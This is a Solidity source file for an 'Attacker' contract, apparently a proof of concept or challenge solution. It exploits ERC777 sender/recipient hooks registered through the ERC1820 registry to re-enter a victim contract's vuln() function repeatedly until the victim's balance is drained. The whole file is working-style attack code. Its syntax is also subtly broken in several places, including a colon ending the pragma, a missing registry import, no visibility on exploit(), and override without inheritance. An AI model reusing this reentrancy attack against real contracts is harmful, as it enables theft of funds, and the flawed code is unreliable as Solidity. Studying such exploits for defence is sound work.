pragma solidity 0.8.7:

import "@openzeppelin-contracts/contracts/token/ERC777/IERC777Sender.sol";
import "@openzeppelin-contracts/contracts/token/ERC777/IERC777Recipient.sol";

contract IVictim {
	function vuln(uint256 amount) external;
	function add_listener(address listener) external;
	function deposit() external payable;
}

contract Attacker {

	bytes32 constant private TOKENS_SENDER_INTERFACE_HASH = 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;
	IERC1820Registry public registry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    
    	bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;
	uint256 private target_balance;
        IVictim private target;
	address private owner;

       constructor(address _target) public payable {
	  target = IVictim(_target);
	  owner = msg.sender;
       }

       function exploit() {
	  target.deposit{value:1 wei}();
	  target_balance = address(target).balance;
	  registry.setInterfaceImplementer(
            address(this),
            TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
          );
	  registry.setInterfaceImplementer(
            address(this),
            TOKENS_SENDER_INTERFACE_HASH,
            address(this)
          );
	  target.add_listener(address(this));
	  target.vuln(1);
       }
      
       function tokensReceived(
        address /*operator*/,
        address from,
        address /*to*/,
        uint256 amount,
        bytes calldata /*userData*/,
        bytes calldata /*operatorData*/
    ) external override {
        require(msg.sender == address(target), "Invalid caller");	
    }
       function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        require(msg.sender == address(target), "Invalid caller");
	if(target_balance>0) {
		target_balance-=1;
		target.vuln(1);
	}
    }
}
